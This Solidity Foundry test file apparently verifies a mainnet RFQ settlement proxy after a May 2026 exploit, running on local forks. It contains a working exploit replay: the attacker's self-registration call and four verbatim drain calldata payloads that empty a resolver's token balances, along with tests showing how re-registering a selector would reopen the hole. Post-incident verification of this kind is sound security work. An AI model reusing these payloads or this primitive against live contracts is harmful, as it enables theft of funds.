// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";

/// @title C-25 TrustedVolumes RFQ settlement — live-state + historical-replay PoC
/// @notice READ-ONLY research. All execution is on local mainnet forks.
///         The historical replay reproduces the 2026-05-07 exploit primitive
///         against a pre-exploit fork state. No real-network transactions.
interface IProxy {
    function owner() external view returns (address);
    function getFunctionImplementation(bytes4 selector) external view returns (address);
    function registerAllowedOrderSigner(address signer, bool allowed) external;
    function extend(bytes4 selector, address impl) external;
    function rollback(bytes4 selector, address impl) external;
    function migrate(address a, bytes calldata b, address c) external;
    function removeTokenSupport(address token) external;
    function transferOwnership(address newOwner) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract C25Test is Test {
    address constant PROXY   = 0xeEeEEe53033F7227d488ae83a27Bc9A9D5051756;
    address constant IMPL    = 0x88eb28009351Fb414A5746F5d8CA91cdc02760d8;
    address constant OWNER   = 0xBa5b79EdBbAFf849F8e754B8d3C107a06fA2921a;
    address constant RESOLVER= 0x9bA0CF1588E1DFA905eC948F7FE5104dD40EDa31;
    address constant ATTACKER= 0xC3EBDdEa4f69df717a8f5c89e7cF20C1c0389100;
    address constant HELPER  = 0xD4D5DB5EC65272B26F756712247281515F211E95;
    address constant RANDO   = 0x1111111111111111111111111111111111111111;

    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;

    /// Exploit tx 0xc5c61b3a... block 25,039,670 (2026-05-07 00:47:35 UTC).
    uint256 constant EXPLOIT_BLOCK = 25_039_670;
    bytes4 constant DRAIN_SEL = 0x4112e1c2;
    bytes4 constant REG_SEL   = 0xea7faa61;
    bytes4 constant NO_IMPL   = 0x734e6e1c;
    bytes4 constant UNAUTH    = 0x1de45ad1;

    bytes constant REG_CALL = hex"ea7faa61000000000000000000000000c3ebddea4f69df717a8f5c89e7cf20c1c03891000000000000000000000000000000000000000000000000000000000000000001";
    bytes constant DRAIN0 = hex"4112e1c2000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000045fe75b854413cec06000000000000000000000000d4d5db5ec65272b26f756712247281515f211e950000000000000000000000009ba0cf1588e1dfa905ec948f7fe5104dd40eda310000000000000000000000000000000000000000000000000000000069fbe1480000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000001b4f6496eb7ebd74e91df255d580b631e48513f271c60994253411dcf2e1aeb4c00b1ad0f7ff67e96997d22b14aa0908b147b6b71bf76c3ef3f41a9c3a35eda6910000000000000000000000000000000000000000000000000000000000000002";
    bytes constant DRAIN1 = hex"4112e1c2000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec70000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000300764581c000000000000000000000000d4d5db5ec65272b26f756712247281515f211e950000000000000000000000009ba0cf1588e1dfa905ec948f7fe5104dd40eda310000000000000000000000000000000000000000000000000000000069fbe1480000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000001c957d7e01305f29e1b3c38169aa877e2e3d7250a25363231074f027462cebb0c243ee738d4a0abe1f96b78c82cefe32af7ba4ad064f270dd0bf417f33726f4bb80000000000000000000000000000000000000000000000000000000000000002";
    bytes constant DRAIN2 = hex"4112e1c2000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb480000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c59900000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000064f705f7000000000000000000000000d4d5db5ec65272b26f756712247281515f211e950000000000000000000000009ba0cf1588e1dfa905ec948f7fe5104dd40eda310000000000000000000000000000000000000000000000000000000069fbe1480000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000001c39a0cb78995ca12d4999f1594e6fd0cc4c8ad9db63f268c38a6f5297806927c904190fdbb1d3a4aa8d58b5125ff293aa8888a9d7891b94dfcecd4500b27b9d270000000000000000000000000000000000000000000000000000000000000002";
    bytes constant DRAIN3 = hex"4112e1c2000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb4800000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000012768ac846f000000000000000000000000d4d5db5ec65272b26f756712247281515f211e950000000000000000000000009ba0cf1588e1dfa905ec948f7fe5104dd40eda310000000000000000000000000000000000000000000000000000000069fbe1480000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000001b4a4632981a75d969b349af56527c32e7c153c9e3a0ab6f2342b9ffab6fe099ba2bcba1cc93023924b884ed8855cb015a87b69010ed217f98e3c20433284519230000000000000000000000000000000000000000000000000000000000000002";

    function _rpc() internal view returns (string memory) {
        return vm.envOr("FORK_RPC_URL", vm.envOr("RPC_URL", string("https://ethereum-rpc.publicnode.com")));
    }

    /// Archive-capable endpoint needed for the historical fork (1.07M blocks back).
    function _archiveRpc() internal view returns (string memory) {
        return vm.envOr("NODEREAL_ETH_RPC_URL",
               vm.envOr("BLOCKPI_RPC_URL",
               vm.envOr("FORK_RPC_URL",
               vm.envOr("RPC_URL", string("https://ethereum-rpc.publicnode.com")))));
    }

    // ------------------------------------------------------------------
    // 1. CURRENT STATE (latest): vulnerable selector is unregistered
    // ------------------------------------------------------------------
    function test_current_drainSelectorUnregistered() public {
        vm.createSelectFork(_rpc());
        assertEq(IProxy(PROXY).getFunctionImplementation(DRAIN_SEL), address(0), "drain selector must be unregistered");
        assertEq(IProxy(PROXY).getFunctionImplementation(REG_SEL), address(0), "register selector must be unregistered");
        (bool ok, bytes memory ret) = PROXY.call(DRAIN0);
        assertFalse(ok, "drain calldata must revert today");
        bytes memory expect = abi.encodeWithSelector(NO_IMPL, DRAIN_SEL);
        assertEq(keccak256(ret), keccak256(expect), "must revert NoImplementation");
    }

    // ------------------------------------------------------------------
    // 2. CURRENT STATE: all registry/token admin is owner-gated
    // ------------------------------------------------------------------
    function test_current_adminOwnerGated() public {
        vm.createSelectFork(_rpc());
        vm.startPrank(RANDO);
        vm.expectRevert();
        IProxy(PROXY).extend(DRAIN_SEL, IMPL);
        vm.expectRevert();
        IProxy(PROXY).rollback(DRAIN_SEL, address(0));
        vm.expectRevert();
        IProxy(PROXY).migrate(RANDO, "", RANDO);
        vm.expectRevert();
        IProxy(PROXY).removeTokenSupport(USDC);
        vm.expectRevert();
        IProxy(PROXY).transferOwnership(RANDO);
        vm.stopPrank();
        // owner() unchanged
        assertEq(IProxy(PROXY).owner(), OWNER);
    }

    // ------------------------------------------------------------------
    // 3. CURRENT STATE: victim approvals are still live (latent), but
    //    no registered selector can spend them; balances are dust.
    // ------------------------------------------------------------------
    function test_current_residualApprovalsAndBalances() public {
        vm.createSelectFork(_rpc());
        assertGt(IERC20(USDC).allowance(RESOLVER, PROXY), type(uint256).max / 2, "resolver USDC approval live");
        assertGt(IERC20(WETH).allowance(RESOLVER, PROXY), type(uint256).max / 2, "resolver WETH approval live");
        assertGt(IERC20(USDT).allowance(RESOLVER, PROXY), type(uint256).max / 2, "resolver USDT approval live");
        assertLe(IERC20(USDC).balanceOf(RESOLVER), 10, "resolver USDC balance is dust");
        assertLe(IERC20(WETH).balanceOf(RESOLVER), 10, "resolver WETH balance is dust");
        // even with live approvals, the drain calldata cannot execute
        (bool ok, ) = PROXY.call(DRAIN0);
        assertFalse(ok, "drain must revert with approvals still live");
        // and the contracts themselves hold nothing
        assertEq(PROXY.balance, 0);
        assertEq(IERC20(USDC).balanceOf(PROXY), 0);
        assertEq(IERC20(WETH).balanceOf(PROXY), 0);
    }

    // ------------------------------------------------------------------
    // 4. HISTORICAL REPLAY (fork at block before exploit): the primitive
    //    works exactly as executed on 2026-05-07 — drains $5.87M.
    // ------------------------------------------------------------------
    function test_historical_exploitReplay() public {
        vm.createSelectFork(_archiveRpc(), EXPLOIT_BLOCK - 1);
        // registry state before the exploit: both selectors live, mapped to the RFQ impl
        assertEq(IProxy(PROXY).getFunctionImplementation(DRAIN_SEL), IMPL);
        assertEq(IProxy(PROXY).getFunctionImplementation(REG_SEL), IMPL);

        uint256 weth0 = IERC20(WETH).balanceOf(RESOLVER);
        uint256 usdt0 = IERC20(USDT).balanceOf(RESOLVER);
        uint256 wbtc0 = IERC20(WBTC).balanceOf(RESOLVER);
        uint256 usdc0 = IERC20(USDC).balanceOf(RESOLVER);
        assertGt(weth0, 1291e18, "pre-exploit resolver WETH");
        assertGt(usdc0, 1_268_771e6, "pre-exploit resolver USDC");

        // attacker helper self-registers the attacker EOA as its allowed order signer
        vm.prank(HELPER);
        IProxy(PROXY).registerAllowedOrderSigner(ATTACKER, true);
        // the helper did not exist one block before the exploit: recreate the two
        // preconditions it satisfied in its constructor (4 wei USDC + allowance to proxy)
        deal(USDC, HELPER, 4);
        vm.prank(HELPER);
        IERC20(USDC).approve(PROXY, 4);

        // replay the four original drain calls verbatim (original caller: the helper)
        vm.startPrank(HELPER);
        (bool ok0, ) = PROXY.call(DRAIN0); assertTrue(ok0, "drain0");
        (bool ok1, ) = PROXY.call(DRAIN1); assertTrue(ok1, "drain1");
        (bool ok2, ) = PROXY.call(DRAIN2); assertTrue(ok2, "drain2");
        (bool ok3, ) = PROXY.call(DRAIN3); assertTrue(ok3, "drain3");
        vm.stopPrank();

        uint256 wethD  = weth0 - IERC20(WETH).balanceOf(RESOLVER);
        uint256 usdtD  = usdt0 - IERC20(USDT).balanceOf(RESOLVER);
        uint256 wbtcD  = wbtc0 - IERC20(WBTC).balanceOf(RESOLVER);
        uint256 usdcD  = usdc0 - IERC20(USDC).balanceOf(RESOLVER);
        emit log_named_decimal_uint("WETH drained", wethD, 18);
        emit log_named_decimal_uint("USDT drained", usdtD, 6);
        emit log_named_decimal_uint("WBTC drained", wbtcD, 8);
        emit log_named_decimal_uint("USDC drained", usdcD, 6);
        assertApproxEqAbs(wethD, 1291.16110521587917927e18, 1e15);
        assertApproxEqAbs(usdtD, 206282.446876e6, 1e3);
        assertApproxEqAbs(wbtcD, 16.93910519e8, 10);
        assertApproxEqAbs(usdcD, 1_268_771.488875e6, 1e3);
    }

    // ------------------------------------------------------------------
    // 5. LATENT: if the owner re-registered the drain selector, the
    //    primitive is intact (attacker self-service signer registration).
    // ------------------------------------------------------------------
    function test_latent_ownerReRegister_reenablesPrimitive() public {
        vm.createSelectFork(_rpc());
        // today: attacker cannot self-register a signer (selector unregistered)
        vm.prank(RANDO);
        (bool ok, ) = PROXY.call(abi.encodeWithSelector(REG_SEL, RANDO, true));
        assertFalse(ok, "self-registration blocked today");
        // simulate the owner restoring the selector on this fork
        vm.prank(OWNER);
        IProxy(PROXY).extend(REG_SEL, IMPL);
        assertEq(IProxy(PROXY).getFunctionImplementation(REG_SEL), IMPL);
        // now anyone can self-authorize a signer
        vm.prank(RANDO);
        (bool ok2, ) = PROXY.call(abi.encodeWithSelector(REG_SEL, RANDO, true));
        assertTrue(ok2, "primitive returns if selector is re-extended");
    }

    // ------------------------------------------------------------------
    // 6. LATENT: the still-registered 0x-fork features cannot spend a
    //    third party's approvals (onlySelf / caller-sourced transfers).
    // ------------------------------------------------------------------
    struct Transformation { uint32 deploymentType; bytes data; }
    struct TransformArgs {
        address taker;
        address inputToken;
        address outputToken;
        uint256 inputTokenAmount;
        uint256 minOutputTokenAmount;
        Transformation[] transformations;
        bool useSelfBalance;
        address recipient;
    }

    function test_latent_transformERC20_onlySelf() public {
        vm.createSelectFork(_rpc());
        deal(USDC, RESOLVER, 10_000e6);
        uint256 before = IERC20(USDC).balanceOf(RESOLVER);
        TransformArgs memory args = TransformArgs({
            taker: RESOLVER,
            inputToken: USDC,
            outputToken: WETH,
            inputTokenAmount: 1e6,
            minOutputTokenAmount: 0,
            transformations: new Transformation[](0),
            useSelfBalance: false,
            recipient: RANDO
        });
        bytes memory cd = abi.encodeWithSelector(0x8aa6539b, args);
        vm.prank(RANDO);
        (bool ok, ) = PROXY.call(cd);
        assertFalse(ok, "onlySelf must block external _transformERC20");
        assertEq(IERC20(USDC).balanceOf(RESOLVER), before, "no resolver tokens moved");
    }

    function test_latent_bridgeFeature_connextDeprecated() public {
        vm.createSelectFork(_rpc());
        vm.prank(RANDO);
        (bool ok, bytes memory ret) = PROXY.call(
            abi.encodeWithSelector(0x5b4a250f, uint256(1), uint256(0), RANDO, bytes(""))
        );
        assertFalse(ok, "connext path must revert");
        assertEq(keccak256(ret),
            keccak256(abi.encodeWithSignature("Error(string)", "connext protocol is deprecated")),
            "deprecated connext path");
    }
}
